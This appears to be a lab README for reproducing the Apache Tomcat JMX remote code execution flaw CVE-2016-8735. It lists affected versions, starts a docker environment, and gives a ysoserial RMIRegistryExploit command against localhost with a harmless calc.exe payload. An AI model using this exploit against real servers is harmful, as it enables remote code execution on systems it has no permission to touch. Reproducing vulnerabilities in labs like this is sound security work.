# Tomcat Remote Code Execution Vulnability(CVE-2016-8735)

## Introduction

Remote code execution is possible with Apache Tomcat if `JmxRemoteLifecycleListener` is used and an attacker can reach JMX ports. The issue exists because this listener wasn't updated for consistency with the `CVE-2016-3427` Oracle patch that affected credential types.

Impact version:

```
Tomcat [6.0.0 6.0.47]
Tomcat [7.0.0 7.0.72]
Tomcat [8.0.0-RC1 8.0.38]
Tomcat [8.5.0 8.5.6]
Tomcat [9.0.0.M1 9.0.0.M11]
```

Request `jdk < 7u131 or 8u121`

## Usage

Run

```bash
docker-compose up
```

After that, use [ysoserial](https://github.com/frohoff/ysoserial) to exploit it.

```bash
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exe
```
